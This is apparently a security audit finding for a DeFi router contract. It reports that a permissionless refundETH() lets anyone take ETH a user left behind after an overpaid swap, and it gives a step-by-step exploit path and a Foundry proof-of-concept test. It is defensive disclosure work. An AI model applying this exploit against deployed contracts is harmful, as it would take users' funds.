Audit Report

## Title
Permissionless `refundETH()` drains excess ETH left on the router by any caller — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary
`refundETH()` sends the router's full ETH balance to `msg.sender` with no access control. When a user calls `exactInputSingle` (or any payable swap function) with `msg.value > amountIn` and `tokenIn == WETH`, `pay()` wraps exactly `amountIn` ETH and silently leaves the remainder on the router. Any third party can then call `refundETH()` in a subsequent transaction to claim that excess ETH, causing a direct, unrecoverable loss for the original caller.

## Finding Description
`refundETH()` is unconditionally callable by any address and transfers the entire contract ETH balance to `msg.sender`: [1](#0-0) 

The `pay()` helper, when `token == WETH` and `nativeBalance >= value`, wraps exactly `value` ETH via `IWETH9.deposit` and leaves the remainder untouched on the contract: [2](#0-1) 

`exactInputSingle` is `payable` and records `msg.sender` as the payer in transient storage, but performs no refund of excess ETH before returning: [3](#0-2) 

The codebase's own test confirms this design: it explicitly requires `refundETH()` as a second multicall entry to recover unused ETH, and only asserts the router is empty after that second call: [4](#0-3) 

The `receive()` guard rejects direct ETH transfers from non-WETH senders, but this does not prevent ETH accumulation via `msg.value` in payable swap functions — it provides no protection against this attack: [5](#0-4) 

**Exploit path:**
1. Victim calls `exactInputSingle{value: 100}(params where amountIn = 90, tokenIn = WETH)` — either directly or via multicall without a `refundETH()` entry.
2. `pay()` wraps 90 ETH; 10 ETH remains on the router.
3. Attacker calls `router.refundETH()` in a separate transaction.
4. `refundETH()` sends the full 10 ETH balance to the attacker's address.
5. Victim has no recovery path.

## Impact Explanation
Direct, permanent loss of user ETH principal. The attacker receives the full excess balance; no record of the original depositor is kept, so the victim cannot recover the funds. This meets the Sherlock threshold for High severity (direct loss of user principal with no recovery path).

## Likelihood Explanation
- Any user who sends `msg.value > amountIn` without bundling `refundETH()` in the same multicall is immediately vulnerable.
- Users calling `exactInputSingle` directly (not via multicall) with excess ETH are always vulnerable, as there is no automatic refund.
- Integrators (wallets, aggregators) building on top of the router may omit the refund step.
- MEV bots can monitor the mempool for transactions that leave ETH on the router and back-run them atomically in the same block.

## Recommendation
Add a `msg.sender`-binding mechanism: record the original multicall initiator at entry (e.g., in transient storage) and restrict `refundETH()` to send only to that recorded address. Alternatively, auto-refund any excess ETH at the end of each payable swap function rather than relying on the caller to include a separate `refundETH()` step in their multicall.

## Proof of Concept
```solidity
function test_attacker_steals_excess_eth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;

    // Victim calls exactInputSingle via multicall with only 1 call (no refundETH)
    bytes[] memory calls = new bytes[](1);
    calls[0] = abi.encodeWithSelector(
        router.exactInputSingle.selector,
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool), tokenIn: address(weth), tokenOut: address(token1),
            zeroForOne: true, amountIn: amountIn, amountOutMinimum: 0,
            recipient: recipient, deadline: _deadline(), priceLimitX64: 0, extensionData: ""
        })
    );
    vm.prank(victim);
    router.multicall{value: msgValue}(calls);
    // (2 ether - 1_000) sits on the router

    // Attacker calls refundETH() in a separate transaction
    uint256 attackerBefore = attacker.balance;
    vm.prank(attacker);
    router.refundETH();

    assertEq(attacker.balance - attackerBefore, msgValue - amountIn); // attacker receives excess
    assertEq(address(router).balance, 0);
    // victim cannot recover the excess ETH
}
```

  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
